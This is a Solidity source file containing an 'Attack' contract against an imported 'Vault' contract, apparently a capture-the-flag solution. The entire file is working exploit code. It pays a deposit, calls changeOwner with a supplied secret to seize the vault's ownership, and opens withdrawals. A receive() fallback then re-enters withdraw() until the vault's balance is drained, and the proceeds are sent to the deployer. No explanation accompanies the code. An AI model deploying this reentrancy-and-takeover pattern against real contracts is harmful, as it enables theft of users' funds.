// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Vault.sol";
contract Attack{
    address payable public owner;
    Vault vault;
    constructor(address payable _vault){
        owner = payable(msg.sender);
        vault = Vault(_vault);
    }
    modifier onlyOwenr(){
        require(msg.sender == owner,"not Owner!");
        _;
    }

    receive() external payable{
        if(address(vault).balance>0 && msg.sender!=owner){
            vault.withdraw();
        }    
    }
    function attack(bytes32 vault_logic)public{
        vault.deposite{value:0.1 ether}();
        (bool success,) = address(vault).call(abi.encodeWithSignature("changeOwner(bytes32,address)", vault_logic,address(this)));
        require(success,"failed to change vault owner");
        vault.openWithdraw();
        vault.withdraw();
    }

    function cliam() public onlyOwenr(){
        owner.transfer(address(this).balance);
    }

}